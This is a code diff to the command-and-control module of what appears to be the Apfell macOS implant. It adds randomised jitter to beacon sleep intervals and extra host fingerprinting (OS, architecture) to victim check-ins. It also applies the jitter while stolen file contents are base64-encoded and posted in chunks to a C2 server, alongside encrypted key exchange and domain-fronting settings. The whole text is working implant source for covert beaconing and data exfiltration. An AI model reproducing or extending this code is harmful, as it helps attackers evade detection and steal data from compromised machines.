@@ -12,6 +12,7 @@ class customC2 extends baseC2{
         this.post_new_callback_eke_aespsk = "EKE_NEW_CALLBACK";
         this.id_field = "IDSTRING";
         this.host_header = "domain_front";
+        this.jitter = callback_jitter;
         this.aes_psk = "AESPSK"; // base64 encoded key
 		if(this.aes_psk != ""){
 		    this.parameters = $({"type": $.kSecAttrKeyTypeAES});
@@ -26,6 +27,15 @@ class customC2 extends baseC2{
             this.exchanging_keys = false;
         }
 	}
+	gen_sleep_time(){
+      //generate a time that's this.interval += (this.interval * 1/this.jitter)
+      let plus_min = Math.round(Math.random());
+      if(plus_min === 1){
+          return this.interval + (this.interval * (Math.round(Math.random()*this.jitter)/100));
+      }else{
+          return this.interval - (this.interval * (Math.round(Math.random()*this.jitter)/100));
+      }
+    }
 	encrypt_message(data){
 	    // takes in the string we're about to send, encrypts it, and returns a new string
 	    //create the encrypt transform variable
@@ -101,7 +111,7 @@ class customC2 extends baseC2{
                 this.exchanging_keys = false;
                 return session_key;
             }catch(error){
-                $.NSThread.sleepForTimeInterval(this.interval);  // don't spin out crazy if the connection fails
+                $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
             }
         }
 	}
@@ -181,11 +191,11 @@ class customC2 extends baseC2{
 		    this.commands = params['commands'];
 		}
 	}
-	checkin(ip, pid, user, host){
+	checkin(ip, pid, user, host, os, arch){
 		//get info about system to check in initially
 		//needs IP, PID, user, host, payload_type
 		//gets back a unique ID
-		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid};
+		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid, "os": os, "architecture": arch};
 		if(user == 'root'){info['integrity_level'] = 3;}
 		//calls htmlPostData(url,data) to actually checkin
 		//var jsondata = this.htmlPostData(this.getPostNewCallbackPath(), JSON.stringify(info));
@@ -219,7 +229,7 @@ class customC2 extends baseC2{
 		        return JSON.parse(task);
 		    }
 		    catch(error){
-		        $.NSThread.sleepForTimeInterval(this.interval);  // don't spin out crazy if the connection fails
+		        $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
 		    }
 		}
 
@@ -296,7 +306,7 @@ class customC2 extends baseC2{
 				}
 			}
 			catch(error){
-			    $.NSThread.sleepForTimeInterval(this.interval);  // don't spin out crazy if the connection fails
+			    $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
 			}
 		}
 	}
@@ -328,7 +338,7 @@ class customC2 extends baseC2{
                 return decrypted_message.js;
 	        }
 	        catch(error){
-	            $.NSThread.sleepForTimeInterval(this.interval); //wait timeout seconds and try again
+	            $.NSThread.sleepForTimeInterval(this.gen_sleep_time()); //wait timeout seconds and try again
 	        }
 	    }
 	}
@@ -366,7 +376,7 @@ class customC2 extends baseC2{
                     fileData = convert_to_nsdata(fileData);
                     this.htmlPostData(url, JSON.stringify({"response": fileData.base64EncodedStringWithOptions(0).js}));
                     //this.postResponse(task, fileData);
-                    $.NSThread.sleepForTimeInterval(this.interval);
+                    $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
 
                     // increment the offset and seek to the amount of data read from the file
                     offset += parseInt(data.length);
